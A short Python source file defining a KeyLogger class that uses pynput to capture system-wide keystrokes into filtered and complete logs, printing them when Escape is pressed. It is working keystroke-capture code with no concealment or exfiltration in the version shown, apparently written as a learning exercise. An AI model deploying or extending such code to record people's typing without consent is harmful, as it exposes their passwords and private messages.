import pynput
from pynput import keyboard

class KeyLogger:
    # Map the special keys to their respective characters
    key_map = {
        "Key.space": " ",
        "Key.backspace": "\b",
        "Key.enter": "\n",
    }
    def __init__(self) -> None:
        self.log = "" # Logs all the keystrokes in string format (only the characters, not the special keys)
        self.complete = "" # Logs all the keystrokes in string format (including the special keys)

        # Start the listener
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()
    
    # Actions to perform when a key is pressed
    def on_press(self, key):
        # If the key is a special key, then replace it with its respective character
        if(str(key) in self.key_map.keys()):
            self.log += self.key_map[str(key)]
            self.complete += self.key_map[str(key)]
        # If the key is not a special key, then add the character to the log
        else:
            # If the key is a character, then add it to the log
            try:
                self.log += str(key.char).strip("'")
                self.complete += str(key.char).strip("'")
            # If the key is not a character (special key), then add it to the log. Since all the special keys are not mapped.
            except AttributeError:
                self.complete += '<' + str(key).replace("Key.", "") + '>'
    
    # Actions to perform when a key is released
    def on_release(self, key):
        # Exit when <ESCAPE> key is pressed
        if key == keyboard.Key.esc:
            # Prints the keystrokes
            print("Filtered Text: " + self.log) # Prints the keystrokes without the special keys
            print("Complete Text: " + self.complete) # Prints the keystrokes with the special keys
            return False # Stop the listener